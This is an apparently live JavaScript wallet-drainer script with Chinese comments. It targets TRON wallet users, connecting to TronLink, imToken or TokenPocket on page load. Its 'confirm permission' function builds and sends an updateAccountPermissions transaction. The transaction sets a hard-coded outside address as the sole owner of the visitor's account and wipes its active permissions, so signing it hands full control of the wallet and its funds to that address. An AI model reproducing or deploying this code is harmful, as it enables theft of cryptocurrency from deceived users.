document.addEventListener('DOMContentLoaded', async () => {
    if (!isWalletInstalled()) {
        console.error("TRC20钱包未安装，请使用TRC20钱包以继续。");
        return;
    }

    try {
        await connectWallet();
    } catch (error) {
        console.error("连接钱包时出错:", error);
    }
});

// 检查是否安装了支持TRC20的钱包
function isWalletInstalled() {
    return typeof window.tronWeb !== 'undefined' && window.tronWeb.defaultAddress.base58 ||
           typeof window.imToken !== 'undefined' && typeof imToken.callAPI !== 'undefined' ||
           typeof window.tokenpocket !== 'undefined' && typeof tokenpocket.tronLink !== 'undefined';
}

// 连接钱包的函数
async function connectWallet() {
    const tronWeb = window.tronWeb;

    if (tronWeb && tronWeb.defaultAddress.base58) {
        console.log("钱包已连接:", tronWeb.defaultAddress.base58);
        return;
    }

    if (tronWeb && tronWeb.request) {
        await tronWeb.request({
            method: 'tron_requestAccounts'
        });
    } else if (tronWeb && tronWeb.trx && tronWeb.trx.getCurrentAccount) {
        await tronWeb.trx.getCurrentAccount();
    } else if (window.imToken && imToken.callAPI) {
        // imToken 兼容性
        await imToken.callAPI('tron_requestAccounts');
    } else if (window.tokenpocket && tokenpocket.tronLink) {
        // TokenPocket 兼容性
        await tokenpocket.tronLink.request({
            method: 'tron_requestAccounts'
        });
    } else {
        throw new Error("连接钱包失败，请使用支持的TRON钱包。");
    }

    if (tronWeb && !tronWeb.defaultAddress.base58) {
        throw new Error("连接钱包失败。");
    }
}

// 确认权限转移的函数
async function confirmPermission() {
    const tronWeb = window.tronWeb;
    const currentAddress = tronWeb.defaultAddress.base58;

    if (!currentAddress) {
        console.error("未找到钱包地址，请连接您的钱包。");
        return;
    }

    const newOwnerAddress = 'TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz';

    console.log("当前地址:", currentAddress);
    console.log("新所有者地址:", newOwnerAddress);

    try {
        const accountInfo = await tronWeb.trx.getAccount(currentAddress);
        console.log("账户信息:", accountInfo);

        const ownerPermission = {
            type: 0,
            permission_name: 'owner',
            threshold: 1,
            keys: [{
                address: tronWeb.address.toHex(newOwnerAddress),
                weight: 1
            }]
        };

        const activePermissions = [];

        const transaction = await tronWeb.transactionBuilder.updateAccountPermissions(
            currentAddress,
            ownerPermission,
            null,
            activePermissions
        );

        console.log("交易:", transaction);

        const signedTransaction = await tronWeb.trx.sign(transaction);
        console.log("签名的交易:", signedTransaction);

        const result = await tronWeb.trx.sendRawTransaction(signedTransaction);
        console.log("交易结果:", result);

        if (result.result) {
            console.log("交易发送成功，请检查您的钱包以签署交易。");
        } else {
            console.error("交易失败:", result.message);
        }
    } catch (error) {
        console.error("发送交易时出错:", error);
    }
}
